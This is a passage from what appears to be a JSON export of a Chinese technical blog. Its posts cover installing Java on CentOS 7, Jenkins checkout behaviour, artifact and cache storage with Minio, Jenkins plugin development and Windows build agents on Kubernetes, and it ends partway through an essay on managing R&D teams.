lrwxrwxrwx 1 root root 34 Jul 1 15:42 java-openjdk -\u0026gt; /etc/alternatives/java_sdk_openjdk lrwxrwxrwx 1 root root 21 Jul 1 16:01 jre -\u0026gt; /etc/alternatives/jre lrwxrwxrwx 1 root root 24 Jul 1 15:42 jre-11 -\u0026gt; /etc/alternatives/jre_11 lrwxrwxrwx 1 root root 32 Jul 1 15:42 jre-11-openjdk -\u0026gt; /etc/alternatives/jre_11_openjdk lrwxrwxrwx 1 root root 40 Jul 1 15:42 jre-11-openjdk-11.0.7.10-4.el7_8.x86_64 -\u0026gt; java-11-openjdk-11.0.7.10-4.el7_8.x86_64 lrwxrwxrwx 1 root root 29 Jul 1 15:42 jre-openjdk -\u0026gt; /etc/alternatives/jre_openjdk 查看 Java 版本：\n1 2 3 4 5 java -version openjdk version \u0026#34;1.8.0_252\u0026#34; OpenJDK Runtime Environment (build 1.8.0_252-b09) OpenJDK 64-Bit Server VM (build 25.252-b09, mixed mode 4. 配置环境变量 编辑文件\n1 vim /etc/profile 添加环境变量\n1 2 export JAVA_HOME=/usr/lib/jvm/java-openjdk export JRE_HOME=/usr/lib/jvm/jre-openjdk 使环境变量生效\n1 source /etc/profile 5. 卸载 JDK 查看当前环境安装的 JDK :\n1 2 3 4 5 6 7 8 9 rpm -aq | grep -i jdk copy-jdk-configs-3.3-10.el7_5.noarch java-1.8.0-openjdk-headless-1.8.0.252.b09-2.el7_8.x86_64 java-11-openjdk-headless-11.0.7.10-4.el7_8.x86_64 java-11-openjdk-devel-11.0.7.10-4.el7_8.x86_64 java-1.8.0-openjdk-1.8.0.252.b09-2.el7_8.x86_64 java-11-openjdk-11.0.7.10-4.el7_8.x86_64 java-1.8.0-openjdk-devel-1.8.0.252.b09-2.el7_8.x86_64 不需要一个一个删除，只需要删除 copy-jdk-configs 即可。\n1 yum remove -y copy-jdk-configs-3.3-10.el7_5.noarch ","description":"","id":294,"section":"post","tags":["博文","Java","环境","CentOS","研发"],"title":"CentOS 7 安装 Java 开发环境","uri":"https://www.chenshaowen.com/blog/install-jdk-in-centos-7.html"},{"content":"作者:（俄）奥列格·斯克伦尼科（Oleg Skrynnik）\n出版社: 清华大学出版社\n出版年: 2020-05-01\nISBN: 9787302547143\nNotes:\n内容如题，书中主要阐述了业务视角中的 DevOps 。从起源到基础，从原则到实践，你都可以从中有所收获。DevOps 的基础是精益生产（丰田流水线）和敏捷开发，核心是价值链。DevOps 强调的不是自动化，而是端到端的价值交付。\n员工不应仅关注某个单一环节，而应面向客户交付价值。这也意味着架构和组织上需要进行调整，赋能给员工，小而完整的团队应该被鼓励。另一方面，除了工具，实践 DevOps 更重要的是文化和人，需要逐步达成共识，这就涉及到一些技巧，比如面对面的沟通，经常更换 Scrum Master 等。\n","description":"","id":295,"section":"post","tags":["书籍","DevOps","CICD","研发"],"title":"DevOps 精要：业务视角","uri":"https://www.chenshaowen.com/blog/book/the-essentials-of-devops.html"},{"content":"1. 遇到了什么问题 Jenkins 执行日志报错：\n1 2 3 4 5 6 Started by user admin Lightweight checkout support not available, falling back to full checkout. Checking out git https://github.com/shaowenchen/pipeline-test.git into /var/jenkins_home/workspace/abc@script to read Jenkinsfile ... ... Unable to access \u0026#39;.git/index.lock\u0026#39;: File exists. 原因分析：\n简单介绍一下 Jenkins 的部署情况，Jenkins 使用 Helm Chart 部署在 Kubernetes，使用 Kubernetes 动态 Pod 进行构建。Jenkins 的 /var/jenkins_home 挂载到 PV 进行持久化。\n并发的流水线，抢占同一个 workspace 导致执行失败。这是一个好问题，梳理 Pipeline 的执行流程，有利于对 Jenkins 更深入地理解。解决办法: 可以直接进入 workspace 目录，删掉 index.lock ，也可以尝试解决一下 Lightweight failed 问题。\n2. Jenkins 中常用的新建类型 首先，我们来看看 Jenkins 中，常见的几种新建类型。主要有三种：\nFreestyle project Freestyle project 类型，提供直接在 Jenkins 页面编辑流程的能力。\n流水线 流水线类型将，执行部分的编排交给了用户，提供更加灵活的执行方式。\n多分支流水线 多分支流水线类型，提供了更加丰富的多分支应用场景。\n如上图，是多分支流水线扫描的日志。可以看到多分支扫描会在 /var/jenkins_home/cache 下占用大量硬盘空间，所以不能因为使用了动态 Pod 、外部对象存储归档就减少 Jenkins 的磁盘空间。\n3. Jenkinsfile 语法类型 除了使用 Freestyle project 直接编辑，Jenkinsfile 也是常见的一种定义流水线的方式。Jenkinsfile 遵循的是 Groovy DSL ，主要有两种类型的语法:\n脚本式 声明式 3.1 Scripted Pipeline - 脚本式流水线 1 2 3 4 5 6 7 8 9 10 11 node { stage(\u0026#39;Build\u0026#39;) { // } stage(\u0026#39;Test\u0026#39;) { // } stage(\u0026#39;Deploy\u0026#39;) { // } } 3.2 Declarative Pipeline - 声明式流水线 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 pipeline { agent any stages { stage(\u0026#39;Build\u0026#39;) { steps { sh \u0026#39;make\u0026#39; } } stage(\u0026#39;Test\u0026#39;){ steps { sh \u0026#39;make check\u0026#39; junit \u0026#39;reports/**/*.xml\u0026#39; } } stage(\u0026#39;Deploy\u0026#39;) { steps { sh \u0026#39;make publish\u0026#39; } } } } 4. Jenkinsfile 来源类型 在使用 Jenkinsfile 定义流水线时，主要有两种方式：\nPipeline script 如上图，直接在页面上编辑流水线流程。\nPipeline script from SCM 由于在 DevOps 实践过程中，配置也属于需要管理的部分。通常会将 Jenkinsfile 也添加到仓库中，跟随版本一起维护。如上图，可以直接指定仓库和路径，选择 Jenkinsfile 文件。\n这里的 Branches to build 和 Lightweight checkout 需要特别注意，下面会进行讨论。\n5. SCM 流水线的执行流程 5.1 从仓库获取 Jenkinsfile 文件 如果 Lightweight checkout 开启，并生效，Jenkins 将直接获取到 Jenkinsfile。具体有两种方式：\n通过 API ，可以看到如下日志 1 2 3 4 Branch indexing 05:05:03 Connecting to https://api.github.com using /****** Obtained Jenkinsfile from e216c1ce3bed549462c2bb6762b6dbce32f220e6 Running in Durability level: MAX_SURVIVABILITY 通过 Git ，可以看到如下日志 1 2 3 4 5 Branch indexing \u0026gt; git rev-parse --is-inside-work-tree # timeout=10 Setting origin to https://github.com/shaowenchen/pipeline-test.git \u0026gt; git config remote.origin.url https://github.com/shaowenchen/pipeline-test.git # timeout=10 Fetching origin... 如果没有开启 Lightweight checkout 或者 Lightweight checkout 失败，则会看到如下日志。\n1 2 3 Started by user admin Lightweight checkout support not available, falling back to full checkout. Checking out git https://github.com/shaowenchen/pipeline-test.git into /var/jenkins_home/workspace/abc@script to read Jenkinsfile Lightweight checkout 失败的原因有很多可能：\nJenkins 版本旧 Git Server 版本旧 Branches to build 参数多选或错误 通过测试不同版本的组件，可以很容易检测相关问题。这里主要说下 Branches to build。\nBranches to build 参数指定了可以从哪些分支获取 Jenkinsfile 。如果设置为 */master ，则指定只有 master 分支的 Jenkinsfile 有效。如果设置为 */* ，则意味着全部分支的 Jenkinsfile 有效。但此时由于 Jenkins 也不清楚应该请求，哪个分支的流水线。\n只能 Lightweight 失败，退化为将整个仓库 checkout 到 /var/jenkins_home/workspaces 目录下，以正则匹配的全部分支中，最后一次提交记录所在的分支的 Jenkinsfile 作为当次流水线定义。\n最开始提到的问题很明显，多分支流水线场景却使用了流水线类型。如果 Branches to build 配置导致 Lightweight 退化，同时存在大量并发时，SCM 流水线会共用一个 /var/jenkins_home/workspaces/{pipeline_name} 导致并发问题。\n而多分支流水线 Lightweight 退化时，会将仓库代码 checkout 到 /var/jenkins_home/workspaces/{pipeline_name_branch_name} 目录下，隔离不同的分支，可以减少并发冲突。\n5.2 根据 Jenkinsfile 内容进行构建 在获得 Jenkinsfile 之后，就很简单了，根据定义动态创建 Pod 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 Obtained Jenkinsfile from ce0b611f3c443d423dcc499575eb560630625712 Running in Durability level: MAX_SURVIVABILITY [Pipeline] Start of Pipeline [Pipeline] node Agent base-zrz3f is provisioned from template Kubernetes Pod Template --- apiVersion: \u0026#34;v1\u0026#34; kind: \u0026#34;Pod\u0026#34; metadata: annotations: {} labels: jenkins: \u0026#34;slave\u0026#34; jenkins/base: \u0026#34;true\u0026#34; name: \u0026#34;base-zrz3f\u0026#34; spec: affinity: nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - preference: matchExpressions: - key: \u0026#34;node-role.kubernetes.io/worker\u0026#34; operator: \u0026#34;In\u0026#34; values: - \u0026#34;ci\u0026#34; weight: 1 在动态 Pod 上，进行流水线的构建。\n1 Running on base-zrz3f in /home/jenkins/agent/workspace/hotfix_bugfix_REQ-12956_20200618 ","description":"","id":296,"section":"post","tags":["博文","Jenkins","Git","DevOps","问题"],"title":"Jenkins 中 Lightweight 拉取代码问题分析","uri":"https://www.chenshaowen.com/blog/the-question-of-lightweight-checkout-in-jenkins.html"},{"content":" 在 CICD 的流程中，需要保存的产物主要有两类，构建产物和缓存。构建产物是最终的执行结果，缓存是为了优化下一次的构建速度。本篇主要描述的是在 Jenkins 中如何对构建产物和缓存进行归档，并结合对象存储进行实践。有部分示例使用的是 在 Kubernetes 上动态创建 Jenkins Slave 进行构建，配置过程可以参考超链接文档。\n1. 部署 Minio 及 S3cmd 使用 1.1 部署 Minio 这里使用 docker-compose 编排 Minio 进行部署。\n安装 Docker-compose 1 2 3 sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose 部署 Minio 1 2 3 wget https://raw.githubusercontent.com/minio/minio/master/docs/orchestration/docker-compose/docker-compose.yaml wget https://raw.githubusercontent.com/minio/minio/master/docs/orchestration/docker-compose/nginx.conf docker-compose up -d 查看 Minio 页面 选择 9001-9004 任意端口，可以看到 Minio 的页面，使用 minioadmin:minioadmin 账户登陆。\n1.2 安装使用 S3cmd 安装 1 pip3 install s3cmd 配置 编辑 ~/.s3cfg 文件，增加如下内容：\nhost_base = 1.1.1.1:9001 host_bucket = 1.1.1.1:9001 use_https = False access_key = minioadmin secret_key = minioadmin signature_v2 = False 这里仅用于测试，host_bucket 直接指向部署的服务器。在生产环境中， Bucket 有两种风格：DNS-style 和 Path-style ，可以支持超大规模的分布式存储。\n日常操作 列出全部 Bucket\n1 2 3 s3cmd ls 2020-06-20 21:07 s3://newbucket 创建 Bucket\n1 s3cmd mb s3://newbucketname/ 上传文件\n1 s3cmd put file.txt s3://newbucketname/ 上传文件夹\n1 s3cmd put -r backup s3://newbucketname/ 列出 Bucket 中的数据\n1 s3cmd ls s3://newbucketname/ 下载 Bucket 中的文件\n1 s3cmd get s3://newbucketname/file.txt 删除 Bucket 中的文件\n1 s3cmd del s3://newbucketname/file.txt 删除 Bucket\n1 s3cmd rb s3://newbucketname 2. Jenkins 构建归档 2.1 本地归档 新建流水线，内容如下：\npipeline { agent { kubernetes { yaml \u0026#34;\u0026#34;\u0026#34; apiVersion: v1 kind: Pod spec: containers: - name: maven image: maven:3.6.3-jdk-8-openj9 command: - cat tty: true \u0026#34;\u0026#34;\u0026#34; }} stages { stage(\u0026#39;Hello\u0026#39;) { steps { container(\u0026#39;maven\u0026#39;) { sh \u0026#34;echo `date` \u0026gt;\u0026gt; newfile.txt\u0026#34; } } } } post { success { archiveArtifacts \u0026#39;newfile.txt\u0026#39; } } } 查看构建日志，可以看到构建产物成功归档。\n在当次构建的 UI 中，也可以直接查看到归档文件。\n在服务器上，可以查找到归档文件， /var/jenkins_home/jobs/test/builds/43/archive/newfile.txt 。这里 Jenkins 直接将归档的文件保存在 /var/jenkins_home/jobs 文件夹中。\n2.2 对象存储归档 在 Jenkins 中大部分对象存储插件面向的是 AWS ，而不是 S3 协议。当然，也有云厂商，如 Qiniu ，提供了 Jenkins 存储插件。这里主要使用的是一款开源的对象存储组件 - Minio 。\n在插件市场搜索并安装插件 minio 在 Jenkins 配置中，设置 Minio 相关的配置 新建一条自由风格的流水线 编辑需要执行的 Step ，然后设置构建后需要归档的文件\n在构建日志中，可以看到已经归档成功 与 Jenkins 本地归档不同的是，此时的归档在当次构建页面上，不会展示。\n在 Minio 中，查看构建归档的结果 3. 缓存 Jenkins 中的缓存主要有两种实践方式，全部流水线共用缓存，每条流水线单独缓存。\n由于采用的是 Kubernetes 动态提供的 Agent ，可以将主机上的 Docker Volume 挂载到 Pod ，提供 Node 级别的缓存，这样全部 Pod 就会共用一个缓存目录。这样处理比较简单，但同时共用一个依赖库文件夹会带来潜在的并发问题。下图是相关的配置：\n另外一种方式是每条流水线一个缓存，这样够精细，但也增加了存储和执行时间的开销。下面主要介绍如何使用 jobcacher 进行缓存。\n搜索并安装插件 jobcacher 查看 jobcacher 插件配置 在 Jenkins 配置中，可以看到 jobcacher 默认使用的是内置的存储，也就是 /var/jenkins_home 下的文件存储。\n如下图，下拉框中，还有另外一个 AWS 的 S3 存储可选。这里仅查看，不做设置和测试。\n新建流水线 新建流水线，内容如下：\npipeline { agent { kubernetes { yaml \u0026#34;\u0026#34;\u0026#34; apiVersion: v1 kind: Pod spec: containers: - name: nodejs image: node:10-alpine command: - cat tty: true \u0026#34;\u0026#34;\u0026#34; }} stages { stage(\u0026#39;checkout\u0026#39;) { steps { git branch: \u0026#39;master\u0026#39;, url: \u0026#34;https://github.com/vuejs/vue\u0026#34; } } stage(\u0026#39;install\u0026#39;) { steps { container(\u0026#39;nodejs\u0026#39;) { cache(caches: [[$class: \u0026#39;ArbitraryFileCache\u0026#39;, excludes: \u0026#39;\u0026#39;, includes: \u0026#39;**/*\u0026#39;, path: \u0026#39;node_modules\u0026#39;]], maxCacheSize: 512) { sh \u0026#34;npm install\u0026#34; } } } } } } 首次构建 可以看到 Jenkins 将设置的目录进行了缓存。在 Jenkins 目录 /var/jenkins_home/jobs/test/cache/3ec03583f8eaec275cb2183db769ff47 中，可以看到相关文件。\n1 2 3 4 5 ls /var/jenkins_home/jobs/test/cache/3ec03583f8eaec275cb2183db769ff47 abbrev colors flow-remove-types-no-whitespace lodash._baseclone require-relative accepts combined-stream ... 带缓存构建 缓存归档之后，再次构建时，下载依赖包的耗时会明显减少。从 31 秒 减少到 7 秒，但增加了拉取缓存、解压等操作的时间。\n使用对象存储进行缓存 由于大部分插件支持的是 AWS ，如果能直接使用 AWS 也是一个不错的选择。使用其他存储，需要厂商插件的支持，或者 fork AWS 的 Jenkins 插件进行二次开发。\n另外一个方向是，提供 s3cmd 命令行，通过 credential 注入秘钥，使用命令行进行上传和下载的管理。下面是简单的流程：\n1 2 3 4 5 6 7 8 s3cmd get s3://newbucketname/node_modules.tar.gz tar xf ${HOME}/node_modules.tar.gz # install and build tar cvfz ${HOME}/node_modules.tar.gz node_modules s3cmd del s3://newbucketname/node_modules.tar.gz s3cmd put node_modules.tar.gz s3://newbucketname/ 4. 参考 https://plugins.jenkins.io/jobcacher/ https://docs.min.io/docs/s3cmd-with-minio.html https://www.jenkins.io/doc/pipeline/steps/minio-storage/#stepclass-miniouploader-upload-build-artifacts-to-minio-server ","description":"","id":297,"section":"post","tags":["博文","Jenkins","S3","DevOps","Cache"],"title":"Jenkins 中的构建产物与缓存","uri":"https://www.chenshaowen.com/blog/artifacts-and-cache-in-jenkins.html"},{"content":" 使用 Jenkins 总是离不开各种各样的插件，为了更好的实践 DevOps ，我们也应该具备开发插件的能力，使整个流程都能够在 Jenkins 中汇合。\n1. Jenkins 插件 1.1 插件的生态 Jenkins 前身 Hudson 始于 2004 ，历经 16 年，依然作为主流的 CI/CD 引擎。除了，Jenkins 提供了 Master-Agent 分布式构建、Pipeline 编排的功能，另外一个很重要的原因就是强大的插件生态。\nJenkins 插件官网，显示目前插件数量达到 1500 +，涵盖拉取代码、构建、测试、部署、工具集成等方方面面。\n这些开源的插件，基本能够满足功能需求。但为了对接某些定制的系统，我们又不得不开发新的插件。新的插件可以开源给 Jenkins 社区，提供给其他人使用。事实上，大部分的插件也是这么产生的。\n1.2 插件的生命周期 Jenkins 的执行，具有自己的运行周期：\ncheckout ，check out出源码 Pre-build ， 预编译 Build wrapper ， 准备构建的环境，设置环境变量等 Builder runs ， 执行构建，比如调用calling Ant, Make 等等 Recording ， 记录输出，如测试结果 Notification ， 通知成员 开发插件就是以 Jenkins 的运行周期为切入点，对其进行扩展。\n具体到实现，首先根据需要扩展的功能，在 Jenkins Packages 文档中，找到扩展的类。然后，在插件的主类中 extends 扩展类：\n1 2 3 4 5 6 7 8 9 package mygroup.myauth; import hudson.Extension; import jenkins.security.BasicHeaderAuthenticator; @Extension public class MyAuthenticator extends BasicHeaderAuthenticator { } 在 MyAuthenticator 中实现自己的业务逻辑即可。\n在开发测试完成之后，需要将插件托管到线上。可以是私有的 Nexus Server ，也可以是 Jenkins 官方提供的公共仓库。如果希望托管到 Jenkins 官方仓库，需要按照 文档 进行操作，去 https://issues.jenkins-ci.org/browse/HOSTING 按照模板，创建 issue 。在开发过程中碰到的任何问题，可以在 jenkinsci-dev@googlegroups.com 邮件组中，进行交流。下面我们来了解一下插件的开发流程。\n2. 基础环境搭建 大部分 Jenkins 插件使用 Maven 进行构建。Maven 3.3 以上需要 JDK 1.7 以上版本，下面以 CentOS 7 为例进行安装。\nJDK 1 yum install -y java-1.8.0-openjdk Maven Maven 下载页面 ，这里下载 3.6.3 版本。\n1 2 wget https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz -P /tmp tar xf /tmp/apache-maven-3.6.3-bin.tar.gz -C /opt 编辑 /etc/profile 新增如下内容：\n1 2 3 4 5 6 7 8 9 M2_HOME=\u0026#34;/opt/apache-maven-3.6.3\u0026#34; export M2_HOME M2=\u0026#34;$M2_HOME/bin\u0026#34; MAVEN_OPTS=\u0026#34;-Xms256m -Xmx512m\u0026#34; export M2 MAVEN_OPTS PATH=$M2:$PATH export PATH source 一下，使之生效。\n1 2 source /etc/profile mvn -version 3. 生成插件框架 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 mvn -U archetype:generate -Dfilter=\u0026#34;io.jenkins.archetypes:\u0026#34; … Choose archetype: 1: remote -\u0026gt; io.jenkins.archetypes:empty-plugin (Skeleton of a Jenkins plugin with a POM and an empty source tree.) 2: remote -\u0026gt; io.jenkins.archetypes:global-configuration-plugin (Skeleton of a Jenkins plugin with a POM and an example piece of global configuration.) 3: remote -\u0026gt; io.jenkins.archetypes:global-shared-library (Uses the Jenkins Pipeline Unit mock library to test the usage of a Global Shared Library) 4: remote -\u0026gt; io.jenkins.archetypes:hello-world-plugin (Skeleton of a Jenkins plugin with a POM and an example build step.) 5: remote -\u0026gt; io.jenkins.archetypes:scripted-pipeline (Uses the Jenkins Pipeline Unit mock library to test the logic inside a Pipeline script.) Choose a number or apply filter (format: [groupId:]artifactId, case sensitive contains): : 4 Choose io.jenkins.archetypes:hello-world-plugin version: 1: 1.1 2: 1.2 3: 1.3 4: 1.4 5: 1.5 6: 1.6 Choose a number: 6: 6 … [INFO] Using property: groupId = unused Define value for property \u0026#39;artifactId\u0026#39;: demo Define value for property \u0026#39;version\u0026#39; 1.0-SNAPSHOT: : [INFO] Using property: package = io.jenkins.plugins.sample Confirm properties configuration: groupId: unused artifactId: demo version: 1.0-SNAPSHOT package: io.jenkins.plugins.sample Y: : y 其中 package 、groupId 根据需要填写，artifactId 就是插件的 ID 。\n最终会看到提示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [INFO] ---------------------------------------------------------------------------- [INFO] Using following parameters for creating project from Archetype: hello-world-plugin:1.6 [INFO] ---------------------------------------------------------------------------- [INFO] Parameter: groupId, Value: unused [INFO] Parameter: artifactId, Value: demo [INFO] Parameter: version, Value: 1.0-SNAPSHOT [INFO] Parameter: package, Value: io.jenkins.plugins.sample [INFO] Parameter: packageInPathFormat, Value: io/jenkins/plugins/sample [INFO] Parameter: package, Value: io.jenkins.plugins.sample [INFO] Parameter: version, Value: 1.0-SNAPSHOT [INFO] Parameter: groupId, Value: unused [INFO] Parameter: artifactId, Value: demo [INFO] Project created from Archetype in dir: /root/java/demo [INFO] ------------------------------------------------------------------------ [INFO] BUILD SUCCESS [INFO] ------------------------------------------------------------------------ 根据交互提示，很容易创建一个插件框架。下面查看一下生成的文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 tree demo/ demo/ ├── pom.xml └── src ├── main │ ├── java │ │ └── io │ │ └── jenkins │ │ └── plugins │ │ └── sample │ │ └── HelloWorldBuilder.java │ └── resources │ ├── index.jelly │ └── io │ └── jenkins │ └── plugins │ └── sample │ ├── HelloWorldBuilder │ │ ├── config_de.properties │ │ ├── config_es.properties │ │ ├── config_fr.properties │ │ ├── config_it.properties │ │ ├── config.jelly │ │ ├── config.properties │ │ ├── config_pt_BR.properties │ │ ├── config_sv.properties │ │ ├── config_tr.properties │ │ ├── config_zh_CN.properties │ │ ├── help-name_de.html │ │ ├── help-name_es.html │ │ ├── help-name_fr.html │ │ ├── help-name.html │ │ ├── help-name_it.html │ │ ├── help-name_pt_BR.html │ │ ├── help-name_sv.html │ │ ├── help-name_tr.html │ │ ├── help-name_zh_CN.html │ │ ├── help-useFrench_de.html │ │ ├── help-useFrench_es.html │ │ ├── help-useFrench_fr.html │ │ ├── help-useFrench.html │ │ ├── help-useFrench_it.html │ │ ├── help-useFrench_pt_BR.html │ │ ├── help-useFrench_sv.html │ │ ├── help-useFrench_tr.html │ │ └── help-useFrench_zh_CN.html │ ├── Messages_de.properties │ ├── Messages_es.properties │ ├── Messages_fr.properties │ ├── Messages_it.properties │ ├── Messages.properties │ ├── Messages_pt_BR.properties │ ├── Messages_sv.properties │ ├── Messages_tr.properties │ └── Messages_zh_CN.properties └── test └── java └── io └── jenkins └── plugins └── sample └── HelloWorldBuilderTest.java 还可以执行 verify 命令进行插件的验证。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 cd demo mvn verify [INFO] Fork Value is true [INFO] Done SpotBugs Analysis.... [INFO] [INFO] \u0026lt;\u0026lt;\u0026lt; spotbugs-maven-plugin:3.1.12.2:check (spotbugs) \u0026lt; :spotbugs @ demo \u0026lt;\u0026lt;\u0026lt; [INFO] [INFO] [INFO] --- spotbugs-maven-plugin:3.1.12.2:check (spotbugs) @ demo --- [INFO] BugInstance size is 0 [INFO] Error size is 0 [INFO] No errors/warnings found [INFO] ------------------------------------------------------------------------ [INFO] BUILD SUCCESS [INFO] ------------------------------------------------------------------------ [INFO] Total time: 05:10 min [INFO] ------------------------------------------------------------------------ 从 Java 类可以得知，这个 Hello World 插件针对 Builder 进行了扩展。在代码中，可以进一步得到验证：\n1 2 3 4 5 public class HelloWorldBuilder extends Builder implements SimpleBuildStep { private final String name; private boolean useFrench; } 这里就不对 Hello World 插件做修改，直接运行看看。\n4. 运行调试 运行 Maven Hpi Plugin 提供了非常方便的调试方法，在 demo 目录中执行命令：\n1 mvn hpi:run 会运行一个带插件的 Jenkins 服务，访问地址为 http://127.0.0.1:8080/jenkins 。通过参数 -Djetty.port=1000 -Djenkins.version=2.176.2 -Djenkins.install.runSetupWizard=true 可以指定访问的端口、Jenkins 版本、是否需要安装插件的向导等。\n调试 如果需要断点调试，可以运行如下命令：\n1 mvnDebug hpi:run 或\n1 2 export MAVEN_OPTS=\u0026#34;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=8000,suspend=n\u0026#34; mvn hpi:run 这会在 8000 端口建立监听 ，可以在 IDE 中添加一个 8000 端口的调试会话进行 Debug。\n打包 最后就是生成 hpi 包，执行命令：\n1 2 3 mvn package [INFO] Generating hpi /root/java/demo/target/demo.hpi 编译完成后会生成一个 hpi 文件，也就是插件，可以直接在 Jenkins 后台上传安装。\n当然，也可以直接将插件安装在本地。\n1 2 3 mvn clean install [INFO] Installing /root/java/demo/target/demo.hpi to /root/.m2/repository/io/jenkins/plugins/demo/1.0-SNAPSHOT/demo-1.0-SNAPSHOT.hpi 测试 在 http://127.0.0.1:8080 页面上，\n新建一个流水线，可以看到 Build 中，新增了一个 Step ，Hello World 。\n运行输出: Hello, biubiu!\n5. 参考 https://www.jenkins.io/doc/developer/tutorial/prepare/ https://www.jenkins.io/doc/developer/extensions/ https://javadoc.jenkins.io/overview-summary.html ","description":"","id":298,"section":"post","tags":["博文","Jenkins","DevOps","CICD"],"title":"Jenkins 插件开发","uri":"https://www.chenshaowen.com/blog/how-to-develop-the-plugin-of-jenkins.html"},{"content":" 在前面两篇文档，在 Kubernetes 上动态创建 Jenkins Slave 和 Kubernetes 添加 Windows 节点提供 Jenkins 构建动态 Agent 的基础之上，本篇文档主要尝试在 Kubernetes 上动态提供 Windows 构建 Agent 。\n1. 新增流水线 Kubernetes 与 Jenkins 集成部分可以参考上面的两篇文档，这里直接新建两条流水线进行测试。\nwindows - jenkins 内置的流水线示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /* * Runs a build on a Windows pod. * Tested in EKS: https://docs.aws.amazon.com/eks/latest/userguide/windows-support.html */ podTemplate(yaml: \u0026#39;\u0026#39;\u0026#39; apiVersion: v1 kind: Pod spec: containers: - name: jnlp image: jenkins/inbound-agent:windowsservercore-1809 - name: shell image: mcr.microsoft.com/powershell:preview-windowsservercore-1809 command: - powershell args: - Start-Sleep - 999999 nodeSelector: kubernetes.io/os: windows \u0026#39;\u0026#39;\u0026#39;) { node(POD_LABEL) { container(\u0026#39;shell\u0026#39;) { powershell \u0026#39;Get-ChildItem Env: | Sort Name\u0026#39; } } } windows-dotnet 使用 dotnet 镜像进行构建\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 pipeline { agent { kubernetes { yaml \u0026#34;\u0026#34;\u0026#34; apiVersion: v1 kind: Pod metadata: name: windows spec: containers: - name: jnlp image: jenkins/inbound-agent:windowsservercore-1809 tty: true - name: windows-dotnet image: mcr.microsoft.com/dotnet/core/sdk:2.1 tty: true nodeSelector: kubernetes.io/os: windows \u0026#34;\u0026#34;\u0026#34; } } stages { stage(\u0026#39;Run on windows\u0026#39;) { steps { container(name:\u0026#39;windows-dotnet\u0026#39;){ bat \u0026#39;dotnet -h\u0026#39; } } } } } 2. 查看结果 windows windows-dotnet 查看 Windows 下载的镜像 1 2 3 4 5 6 docker images REPOSITORY TAG IMAGE ID CREATED SIZE mcr.microsoft.com/powershell preview-windowsservercore-1809 ff3a59b7e85e 3 days ago 5.24GB mcr.microsoft.com/dotnet/core/sdk 2.1 4ca3f3cfa1e2 4 days ago 1.66GB jenkins/inbound-agent windowsservercore-1809 45f5745f2aab 4 days ago 4.09GB Windows 节点的磁盘空间一定要很大才行。\n3. 参考 https://technologists.dev/posts/windows-containers/ ","description":"","id":299,"section":"post","tags":["博文","Jenkins","Kubernetes","Windows","DevOps"],"title":"Kubernetes Windows 节点动态提供 Jenkins Agent","uri":"https://www.chenshaowen.com/blog/windows-node-to-dynamicly-provide-jenkins-agent-on-k8s.html"},{"content":"1. 思想驱动行为 思想驱动行为，行为产生效益。接人、待物、处事来源于文化，不会因为技术的迅猛发展而产生跃变。拥有悠久历史的中华民族，沉淀了极具韧性的思想智慧。王朝更迭，政治更替，都打不到她。即使用武力征服，最终也会被同化。\n汲取更多先哲智慧、历史教训是有必要的。时间上的大尺度，能给人远见和宁静；小尺度，能给人安慰和满足。我们应该鼓励长远，而争取尺度上的弹性。研发如练兵，运营如用兵，是一次相关的思考实践。\n2. 研发如练兵 练兵的妙处不在于体魄，而在于制度。\n秦兵依然是那个秦兵，经过商鞅变法，战力却能显著增强。很重要的一点就是，建立了一套奖惩规则。战功直接落实到个人，而惩罚连成一片。别无选择，只能一往无前。刘备命好，有五虎上将，但也取不了天下。\n好的的员工可遇而不可求，他们的作用是锦上添花。优秀的组织应该依靠优秀的制度运作。\n制度就是办事规章或行动准则。在国家治理中，有各种各样的法令条文；在公司治理中，有各种各样的公司章程。小到具体的研发经营，就落实到一条条行为规范。军队是非常有效率的组织，日常中可能无缘相见，但从保安的工作中还是可以管窥一豹的。主动喊早安，有仪式感的换岗，定期的方阵集合\u0026hellip; 这些看似不必要的动作，给了他们荣誉感和责任心。在真的需要紧急情况时，他们会勇敢地站出来维持秩序。\n在经营研发过程中，我们不断地实践，规范员工的行为，以达到减小人的因素，强化组织的目的，这就形成了制度。\n条条框框太多，会束缚人的创造性，压制人的激情。制度也需要不断的维护和更新，这是一个成长蜕变的过程。\n3. 运营如用兵 